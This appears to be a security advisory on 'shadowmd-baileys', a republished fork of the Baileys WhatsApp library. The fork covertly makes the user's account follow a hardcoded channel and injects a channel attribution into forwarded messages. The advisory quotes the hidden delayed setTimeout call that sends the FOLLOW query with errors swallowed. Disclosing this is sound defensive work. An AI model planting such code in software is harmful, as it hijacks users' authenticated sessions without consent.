details: shadowmd-baileys is a re-published fork of the Baileys WhatsApp multi-device library that silently subscribes the running account to a hardcoded WhatsApp channel and injects a channel attribution into messages it sends. lib/Socket/newsletter.js is required for every socket (via makeMessagesSocket in lib/Socket/messages-send.js) and unconditionally schedules setTimeout(async () => { await newsletterWMexQuery("120363423975826201@newsletter", QueryIds.FOLLOW) }, 90000) with all errors swallowed, sending a "w:mex" iq with query id FOLLOW for the hardcoded channel JID 120363423975826201@newsletter inside the user's authenticated session. lib/Socket/idk-bruh.js stamps a second hardcoded channel, 120363407277177688@newsletter ("who know"), into forwarded "status" event messages via forwardedNewsletterMessageInfo. The preinstall hook (engine-requirements.js) only enforces Node.js >= 20. The package has no repository or changelog separating these changes from upstream Baileys, and the behaviour runs without operator consent.
